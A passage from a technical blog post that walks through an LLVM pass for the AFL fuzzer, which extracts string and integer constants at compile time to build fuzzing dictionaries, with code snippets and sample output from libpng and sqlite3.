<li>Run every test cases through the new binary with the libtokencap <code>LD_PRELOAD</code>&rsquo;d.</li>
</ul>


<p>..we build the dictionary at compile time. The idea behind this, is to have another pass hooking the build process, is looking for tokens at <em>compile</em> time and is building a dictionary ready to use for your first fuzz run. Thanks to LLVM this can be written with less than 400 lines of code. It is also easy to read, easy to write and is architecture independent as it is even running before the back-end.</p>

<p>This is the problem that I will walk you through in this post, AKA yet-another-example-of-llvm-pass. Here we are anyway, an occasion to get back at blogging one might even say!</p>

<p>Before diving in, here what we actually want the pass to do:</p>

<ul>
<li>Walk through every instructions compiled, find all the function calls,</li>
<li>When the function call target is one of the function of interest (<code>strcmp</code>, <code>memcmp</code>, etc), we extract the arguments,</li>
<li>If one of the arguments is an hard-coded string, then we save it as a token in the dictionary being built at compile time.</li>
</ul>


<h1>afl-llvm-tokencap-pass.so.cc</h1>

<p>In case you are already very familiar with LLVM and its pass mechanism, here is <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/afl-llvm-tokencap-pass.so.cc">afl-llvm-tokencap-pass.so.cc</a> and the <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/afl-2.31b.patch">afl.patch</a> &ndash; it is about 300 lines of C++ and is pretty straightforward to understand.</p>

<p>Now, for all the others that would like a walk-through the source code let&rsquo;s do it.</p>

<h2>AFLTokenCap class</h2>

<p>The most important part of this file is the <code>AFLTokenCap</code> class which is walking through the LLVM IL instructions looking for tokens. LLVM gives you the possibility to work at <a href="http://llvm.org/docs/WritingAnLLVMPass.html">different granularity levels</a> when writing a pass (more granular to the less granular): BasicBlockPass, FunctionPass, ModulePass, etc. Note that those are not the only ones, there are quite a few others that work slightly differently: MachineFunctionPass, RegionPass, LoopPass, etc.</p>

<p>When you are writing a pass, you write a class that subclasses a <code>*Pass</code> parent class. Doing that means you are expected to implement different virtual methods that will be called under specific circumstances &ndash; but basically you have three functions: <code>doInitialization</code>, <code>runOn*</code> and <code>doFinalization</code>. The first one and the last one are rarely used, but they can provide you a way to execute code once all the basic-blocks have been run through or prior. The <code>runOn*</code> function is important though: this is the function that is going to get called with an LLVM object you are free to walk-through (<em>Analysis</em> passes according to the <a href="http://llvm.org/docs/Passes.html">LLVM nomenclature</a>) or modify (<em>Transformation</em> passes) it. As I said above, the LLVM objects are basically <code>Module</code>/<code>Function</code>/<code>BasicBlock</code> instances. In case it is not that obvious, a <code>Module</code> (a <code>.c</code> file) is made of <code>Function</code>s, and a <code>Function</code> is made of <code>BasicBlock</code>s, and a <code>BasicBlock</code> is a set of <code>Instruction</code>s. I also suggest you take a look at the <a href="http://llvm.org/docs/WritingAnLLVMPass.html#writing-an-llvm-pass-basiccode">HelloWorld pass</a> from the LLVM wiki, it should give you another simple example to wrap your head around the concept of pass.</p>

<p>For today&rsquo;s use-case I have chosen to subclass <code>BasicBlockPass</code> because our analysis doesn&rsquo;t need anything else than a <code>BasicBlock</code> to work. This is the case because we are mainly interested to capture certain arguments passed to certain function calls. Here is what looks like a function call in the <a href="http://llvm.org/docs/LangRef.html">LLVM IR</a> world:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>%retval = call i32 @test(i32 %argc)
</span><span class='line'>call i32 (i8*, ...)* @printf(i8* %msg, i32 12, i8 42)   ; yields i32
</span><span class='line'>%X = tail call i32 @foo()                               ; yields i32
</span><span class='line'>%Y = tail call fastcc i32 @foo()                        ; yields i32
</span><span class='line'>call void %foo(i8 97 signext)
</span><span class='line'>
</span><span class='line'>%struct.A = type { i32, i8 }
</span><span class='line'>%r = call %struct.A @foo()             ; yields { i32, i8 }
</span><span class='line'>%gr = extractvalue %struct.A %r, 0     ; yields i32
</span><span class='line'>%gr1 = extractvalue %struct.A %r, 1    ; yields i8
</span><span class='line'>%Z = call void @foo() noreturn         ; indicates that %foo never returns normally
</span><span class='line'>%ZZ = call zeroext i32 @bar()          ; Return value is %zero extended
</span></code></pre></td></tr></table></div></figure>


<p>Every time <code>AFLTokenCap::runOnBasicBlock</code> is called, the LLVM mid-end will call into our analysis pass (either statically linked into clang/opt or will dynamically load it) with a <code>BasicBlock</code> passed by reference. From there, we can iterate through the set of instructions contained in the basic block and find the <a href="http://llvm.org/docs/LangRef.html#call-instruction">call</a> instructions. Every instructions subclass the top level <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1Instruction.html">llvm::Instruction</a> class &ndash; in order to filter you can use the <code>dyn_cast&lt;T&gt;</code> template function that works like the <code>dynamic_cast&lt;T&gt;</code> operator but does not rely on RTTI (and is more efficient &ndash; according to the <a href="http://llvm.org/docs/CodingStandards.html">LLVM coding standards</a>). Used in conjunction with a <a href="http://en.cppreference.com/w/cpp/language/range-for">range-based for loop</a> on the <code>BasicBlock</code> object you can iterate through all the instructions you want.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="kt">bool</span> <span class="n">AFLTokenCap</span><span class="o">::</span><span class="n">runOnBasicBlock</span><span class="p">(</span><span class="n">BasicBlock</span> <span class="o">&amp;</span><span class="n">B</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="n">I_</span> <span class="o">:</span> <span class="n">B</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* Handle calls to functions of interest */</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">CallInst</span> <span class="o">*</span><span class="n">I</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">CallInst</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">I_</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="c1">// [...]</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once we have found a <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1CallInst.html">llvm::CallInst</a> instance, we need to:</p>

<ul>
<li>Get the name of the called function, assuming it is not an indirect target: <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1CallInst.html#a0bcd4131e1a1d92215f5385b4e16cd2e">llvm::CallInst::getCalledFunction</a></li>
<li>Further the analysis only if only it is a <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/afl-llvm-tokencap-pass.so.cc#L193">function of interest</a>: <code>strcmp</code>, <code>strncmp</code>, <code>strcasecmp</code>, <code>strncasecmp</code>, <code>memcmp</code></li>
<li>Extract the arguments passed to the function: <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1CallInst.html#ac88b95273e6c753188f6a54d65548579">llvm::CallInst::getNumArgOperands</a>, <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1CallInst.html#a150b33ecedbc8c7803c2db8040fbe3f8">llvm::CallInst::getArgOperand</a></li>
<li>Detect hard-coded strings (we will consider a subset of them as tokens)</li>
</ul>


<p>Not sure you have noticed yet, but all the objects we are playing with are not only subclassed from <code>llvm::Instruction</code>. You also have to deal with <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1Value.html">llvm::Value</a> which is an even more top-level class (<code>llvm::Instruction</code> is a child of <code>llvm::Value</code>). But <code>llvm::Value</code> is also used to represent constants: think of hard-coded strings, integers, etc.</p>

<h2>Detecting hard-coded strings</h2>

<p>In order to detect hard-coded strings in the arguments passed to function calls, I decided to filter out the <code>llvm::ConstantExpr</code>. As its name suggests, this class handles &ldquo;a constant value that is initialized with an expression using other constant values&rdquo;.</p>

<p>The end goal, is to find <code>llvm::ConstantDataArray</code>s and to retrieve their raw values &ndash; those will be the hard-coded strings we are looking for.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>/home/over/workz/afl-2.35b/afl-clang-fast -c -W -Wall -O3 -funroll-loops   -fPIC -o png.pic.o png.c
</span><span class='line'>[...]
</span><span class='line'>afl-llvm-tokencap-pass 2.35b by &lt;0vercl0k@tuxfamily.org&gt;
</span><span class='line'>[...]
</span><span class='line'>[+] Call to memcmp with constant &quot;\x00\x00\xf6\xd6\x00\x01\x00\x00\x00\x00\xd3&quot; found in png.c/png_icc_check_header
</span></code></pre></td></tr></table></div></figure>


<p>At this point, the pass basically does what the token capture library is able to do.</p>

<h2>Harvesting integer immediate</h2>

<p>After playing around with it on libpng though, I quickly was wondering why the pass would not extract all the constants I could find in <a href="https://github.com/rc0r/afl-fuzz/blob/master/dictionaries/png.dict">one of the dictionary</a> already generated and shipped with afl:</p>

<figure class='code'><figcaption><span>png.dict</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>section_IDAT=&quot;IDAT&quot;
</span><span class='line'>section_IEND=&quot;IEND&quot;
</span><span class='line'>section_IHDR=&quot;IHDR&quot;
</span><span class='line'>section_PLTE=&quot;PLTE&quot;
</span><span class='line'>section_bKGD=&quot;bKGD&quot;
</span><span class='line'>section_cHRM=&quot;cHRM&quot;
</span><span class='line'>section_fRAc=&quot;fRAc&quot;
</span><span class='line'>section_gAMA=&quot;gAMA&quot;
</span><span class='line'>section_gIFg=&quot;gIFg&quot;
</span><span class='line'>section_gIFt=&quot;gIFt&quot;
</span><span class='line'>section_gIFx=&quot;gIFx&quot;
</span><span class='line'>section_hIST=&quot;hIST&quot;
</span><span class='line'>section_iCCP=&quot;iCCP&quot;
</span><span class='line'>section_iTXt=&quot;iTXt&quot;
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>Some of those can be found in the function <a href="https://github.com/glennrp/libpng/blob/libpng16/pngpread.c#L226">png_push_read_chunk</a> in the file <a href="https://github.com/glennrp/libpng/blob/libpng16/pngpread.c">pngpread.c</a> for example:</p>

<figure class='code'><figcaption><span>png_push_read_chunk</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define png_IHDR PNG_U32( 73,  72,  68,  82)</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">chunk_name</span> <span class="o">==</span> <span class="n">png_IHDR</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">png_ptr</span><span class="o">-&gt;</span><span class="n">push_length</span> <span class="o">!=</span> <span class="mi">13</span><span class="p">)</span>
</span><span class='line'>     <span class="n">png_error</span><span class="p">(</span><span class="n">png_ptr</span><span class="p">,</span> <span class="s">&quot;Invalid IHDR length&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">PNG_PUSH_SAVE_BUFFER_IF_FULL</span>
</span><span class='line'>  <span class="nf">png_handle_IHDR</span><span class="p">(</span><span class="n">png_ptr</span><span class="p">,</span> <span class="n">info_ptr</span><span class="p">,</span> <span class="n">png_ptr</span><span class="o">-&gt;</span><span class="n">push_length</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">chunk_name</span> <span class="o">==</span> <span class="n">png_IEND</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">PNG_PUSH_SAVE_BUFFER_IF_FULL</span>
</span><span class='line'>  <span class="n">png_handle_IEND</span><span class="p">(</span><span class="n">png_ptr</span><span class="p">,</span> <span class="n">info_ptr</span><span class="p">,</span> <span class="n">png_ptr</span><span class="o">-&gt;</span><span class="n">push_length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">png_ptr</span><span class="o">-&gt;</span><span class="n">process_mode</span> <span class="o">=</span> <span class="n">PNG_READ_DONE_MODE</span><span class="p">;</span>
</span><span class='line'>  <span class="n">png_push_have_end</span><span class="p">(</span><span class="n">png_ptr</span><span class="p">,</span> <span class="n">info_ptr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">chunk_name</span> <span class="o">==</span> <span class="n">png_PLTE</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">PNG_PUSH_SAVE_BUFFER_IF_FULL</span>
</span><span class='line'>  <span class="n">png_handle_PLTE</span><span class="p">(</span><span class="n">png_ptr</span><span class="p">,</span> <span class="n">info_ptr</span><span class="p">,</span> <span class="n">png_ptr</span><span class="o">-&gt;</span><span class="n">push_length</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In order to also grab those guys, I have decided to add the support for compare instructions with integer immediate (in one of the operand). Again, thanks to LLVM this is really easy to pull that off: we just need to find the <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1ICmpInst.html">llvm::ICmpInst</a> instructions. The only thing to keep in mind is  false positives. In order to lower the false positives rate, I have chosen to consider an integer immediate as a token only if only it is fully ASCII (like the <code>libpng</code> tokens above)</p>

<p>We can even push it a bit more, and handle switch statements via the same strategy. The only additional step is to retrieve every <code>cases</code> from in the <code>switch</code> statement: <a href="http://llvm.org/docs/doxygen/html/classllvm_1_1SwitchInst.html#a8e7005748409a956c8875e259716559b">llvm::SwitchInst::cases</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="cm">/* Handle switch/case with integer immediates */</span>
</span><span class='line'><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">SwitchInst</span> <span class="o">*</span><span class="n">SI</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">SwitchInst</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">I_</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="n">CIT</span> <span class="o">:</span> <span class="n">SI</span><span class="o">-&gt;</span><span class="n">cases</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">ConstantInt</span> <span class="o">*</span><span class="n">CI</span> <span class="o">=</span> <span class="n">CIT</span><span class="p">.</span><span class="n">getCaseValue</span><span class="p">();</span>
</span><span class='line'>    <span class="n">dump_integer_token</span><span class="p">(</span><span class="n">CI</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Limitations</h2>

<p>The main limitation is that as you are supposed to run the pass as part of the compilation process, it is most likely going to end-up compiling tests or utilities that the library ships with. Now, this is annoying as it may add some noise to your tokens &ndash; especially with utility programs. Those ones usually parse input arguments and some use <code>strcmp</code> like function with hard-coded strings to do their parsing.</p>

<p>A partial solution (as in, it reduces the noise, but does not remove it entirely) I have implemented is just to not process any functions called <code>main</code>. Most of the cases I have seen (the set of samples is pretty small I won&rsquo;t lie >:]), this argument parsing is made in the <code>main</code> function and it is very easy to not process it by blacklisting it as you can see below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="kt">bool</span> <span class="n">AFLTokenCap</span><span class="o">::</span><span class="n">runOnBasicBlock</span><span class="p">(</span><span class="n">BasicBlock</span> <span class="o">&amp;</span><span class="n">B</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>  <span class="n">Function</span> <span class="o">*</span><span class="n">F</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">getParent</span><span class="p">();</span>
</span><span class='line'>  <span class="n">m_FunctionName</span> <span class="o">=</span> <span class="n">F</span><span class="o">-&gt;</span><span class="n">hasName</span><span class="p">()</span> <span class="o">?</span> <span class="n">F</span><span class="o">-&gt;</span><span class="n">getName</span><span class="p">().</span><span class="n">data</span><span class="p">()</span> <span class="o">:</span> <span class="s">&quot;unknown&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">m_FunctionName</span><span class="p">,</span> <span class="s">&quot;main&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Another thing I wanted to experiment on, but did not, was to provide a regular expression like string (think &ldquo;test/*&rdquo;) and not process every files/path that are matching it. You could easily blacklist a whole directory of tests with this.</p>

<h2>Demo</h2>

<p>I have not spent much time trying it out on a lot of code-bases (feel free to send me your feedbacks if you run it on yours though!), but here are some example results with various degree of success.. or not. Starting with <code>libpng</code>:</p>

<figure class='code'><figcaption><span>lpng</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>over@bubuntu:~/workz/lpng1625$ AFL_TOKEN_FILE=/tmp/png.dict make
</span><span class='line'>cp scripts/pnglibconf.h.prebuilt pnglibconf.h
</span><span class='line'>/home/over/workz/afl-2.35b/afl-clang-fast -c -I../zlib  -W -Wall -O3 -funroll-loops   -o png.o png.c
</span><span class='line'>afl-clang-fast 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>afl-llvm-tokencap-pass 2.35b by &lt;0vercl0k@tuxfamily.org&gt;
</span><span class='line'>afl-llvm-pass 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>[+] Instrumented 945 locations (non-hardened mode, ratio 100%).
</span><span class='line'>[+] Found alphanum constant &quot;acsp&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Call to memcmp with constant &quot;\x00\x00\xf6\xd6\x00\x01\x00\x00\x00\x00\xd3&quot; found in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;RGB &quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;GRAY&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;scnr&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;mntr&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;prtr&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;spac&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;abst&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;link&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;nmcl&quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;XYZ &quot; in png.c/png_icc_check_header
</span><span class='line'>[+] Found alphanum constant &quot;Lab &quot; in png.c/png_icc_check_header
</span><span class='line'>[...]
</span><span class='line'>over@bubuntu:~/workz/lpng1625$ sort -u /tmp/png.dict
</span><span class='line'>&quot;abst&quot;
</span><span class='line'>&quot;acsp&quot;
</span><span class='line'>&quot;bKGD&quot;
</span><span class='line'>&quot;cHRM&quot;
</span><span class='line'>&quot;gAMA&quot;
</span><span class='line'>&quot;GRAY&quot;
</span><span class='line'>&quot;hIST&quot;
</span><span class='line'>&quot;iCCP&quot;
</span><span class='line'>&quot;IDAT&quot;
</span><span class='line'>&quot;IEND&quot;
</span><span class='line'>&quot;IHDR&quot;
</span><span class='line'>&quot;iTXt&quot;
</span><span class='line'>&quot;Lab &quot;
</span><span class='line'>&quot;link&quot;
</span><span class='line'>&quot;mntr&quot;
</span><span class='line'>&quot;nmcl&quot;
</span><span class='line'>&quot;oFFs&quot;
</span><span class='line'>&quot;pCAL&quot;
</span><span class='line'>&quot;pHYs&quot;
</span><span class='line'>&quot;PLTE&quot;
</span><span class='line'>&quot;prtr&quot;
</span><span class='line'>&quot;RGB &quot;
</span><span class='line'>&quot;sBIT&quot;
</span><span class='line'>&quot;sCAL&quot;
</span><span class='line'>&quot;scnr&quot;
</span><span class='line'>&quot;spac&quot;
</span><span class='line'>&quot;sPLT&quot;
</span><span class='line'>&quot;sRGB&quot;
</span><span class='line'>&quot;tEXt&quot;
</span><span class='line'>&quot;tIME&quot;
</span><span class='line'>&quot;tRNS&quot;
</span><span class='line'>&quot;\x00\x00\xf6\xd6\x00\x01\x00\x00\x00\x00\xd3&quot;
</span><span class='line'>&quot;XYZ &quot;
</span><span class='line'>&quot;zTXt&quot;
</span></code></pre></td></tr></table></div></figure>


<p>On <a href="https://github.com/mackyle/sqlite">sqlite3</a> (<a href="">sqlite.dict</a>):</p>

<figure class='code'><figcaption><span>sqlite3</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>over@bubuntu:~/workz/sqlite3$ AFL_TOKEN_FILE=/tmp/sqlite.dict [/home/over/workz/afl-2.35b/afl-clang-fast stub.c sqlite3.c -lpthread -ldl -o a.out
</span><span class='line'>[...]
</span><span class='line'>afl-llvm-tokencap-pass 2.35b by &lt;0vercl0k@tuxfamily.org&gt;
</span><span class='line'>afl-llvm-pass 2.35b by &lt;lszekeres@google.com&gt;
</span><span class='line'>[+] Instrumented 47546 locations (non-hardened mode, ratio 100%).
</span><span class='line'>[+] Call to strcmp with constant &quot;unix-excl&quot; found in sqlite3.c/unixOpen
</span><span class='line'>[+] Call to memcmp with constant &quot;SQLite format 3&quot; found in sqlite3.c/sqlite3BtreeBeginTrans
</span><span class='line'>[+] Call to memcmp with constant &quot;@  &quot; found in sqlite3.c/sqlite3BtreeBeginTrans
</span><span class='line'>[+] Call to strcmp with constant &quot;BINARY&quot; found in sqlite3.c/sqlite3_step
</span><span class='line'>[+] Call to strcmp with constant &quot;:memory:&quot; found in sqlite3.c/sqlite3BtreeOpen
</span><span class='line'>[+] Call to strcmp with constant &quot;nolock&quot; found in sqlite3.c/sqlite3BtreeOpen
</span><span class='line'>[+] Call to strcmp with constant &quot;immutable&quot; found in sqlite3.c/sqlite3BtreeOpen
</span><span class='line'>[+] Call to memcmp with constant &quot;\xd9\xd5\x05\xf9 \xa1c&quot; found in sqlite3.c/syncJournal
</span><span class='line'>[+] Found alphanum constant &quot;char&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Found alphanum constant &quot;clob&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Found alphanum constant &quot;text&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Found alphanum constant &quot;blob&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Found alphanum constant &quot;real&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Found alphanum constant &quot;floa&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Found alphanum constant &quot;doub&quot; in sqlite3.c/yy_reduce
</span><span class='line'>[+] Call to strcmp with constant &quot;sqlite_sequence&quot; found in sqlite3.c/sqlite3StartTable
</span><span class='line'>[+] Call to memcmp with constant &quot;file:&quot; found in sqlite3.c/sqlite3ParseUri
</span><span class='line'>[+] Call to memcmp with constant &quot;localhost&quot; found in sqlite3.c/sqlite3ParseUri
</span><span class='line'>[+] Call to memcmp with constant &quot;vfs&quot; found in sqlite3.c/sqlite3ParseUri
</span><span class='line'>[+] Call to memcmp with constant &quot;cache&quot; found in sqlite3.c/sqlite3ParseUri
</span><span class='line'>[+] Call to memcmp with constant &quot;mode&quot; found in sqlite3.c/sqlite3ParseUri
</span><span class='line'>[+] Call to strcmp with constant &quot;localtime&quot; found in sqlite3.c/isDate
</span><span class='line'>[+] Call to strcmp with constant &quot;unixepoch&quot; found in sqlite3.c/isDate
